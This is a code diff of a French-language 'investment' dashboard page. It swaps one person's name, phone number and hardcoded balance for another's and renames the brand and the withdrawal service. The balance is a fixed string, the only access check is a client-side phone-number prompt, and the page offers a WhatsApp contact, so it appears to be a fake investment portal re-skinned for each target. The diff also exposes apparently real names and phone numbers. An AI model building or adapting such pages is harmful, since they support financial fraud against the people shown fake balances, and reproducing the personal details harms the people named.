@@ -251,7 +251,7 @@
 <body>
     <script>
         let code = prompt("Veuillez entrer votre numéro de téléphone :");
-        if (code === "0150463067") {
+        if (code === "0758243773") {
             document.body.style.display = 'block';
         } else {
             alert("numéro incorrect. Accès refusé.");
@@ -261,14 +261,14 @@
 
     <header>
         <div class="logo">
-            <h1>BMI Investissement</h1>
+            <h1>Africa Investissement</h1>
         </div>
         <nav>
             <div class="actions">
-                <span class="balance">Solde: 1 800 000 F CFA</span>
+                <span class="balance">Solde: 1 300 000 F CFA</span>
                 <div class="account-info">
-                    <span id="user-name">TRAORE SARA KADIDJATOU</span><br>
-                    <span id="user-phone">225 01 50 46 30 67</span>
+                    <span id="user-name">KOUE BI LOBO ALEXANDRE</span><br>
+                    <span id="user-phone">225 07 58 24 37 73</span>
                 </div>
                 <button id="whatsapp-button">Contact WhatsApp</button>
                 <button id="logout-button">Déconnexion</button>
@@ -297,7 +297,7 @@
                 </div>
             </section>
             <section class="actions-container">
-                <button id="orange-money">Retirer via Wave Money</button>
+                <button id="orange-money">Retirer via Orange Money</button>
                 <button id="paypal">Retirer via PayPal</button>
             </section>
             <section class="withdrawal-form" id="withdrawal-form">
@@ -330,17 +330,17 @@
             setInterval(updatePrice, 5000);
 
             const setWithdrawalInfo = (method) => {
-                const accountName = "TRAORE SARA KADIDJATOU";
-                const accountNumber = "225 01 50 46 30 67";
-                const balance = "1 800 000 F CFA";
+                const accountName = "KOUE BI LOBO ALEXANDRE";
+                const accountNumber = "225 07 58 24 37 73";
+                const balance = "1 300 000 F CFA";
                 withdrawalInfo.innerHTML = `${accountName}<br>${accountNumber}<br>${balance}<br>via ${method}`;
                 withdrawalForm.style.display = 'flex';
             };
 
             document.getElementById('orange-money').addEventListener('click', () => {
-                const confirmWithdrawal = confirm("Voulez-vous vraiment retirer via Wave Money ?");
+                const confirmWithdrawal = confirm("Voulez-vous vraiment retirer via Orange Money ?");
                 if (confirmWithdrawal) {
-                    setWithdrawalInfo("wave Money");
+                    setWithdrawalInfo("Orange Money");
                 }
             });
 
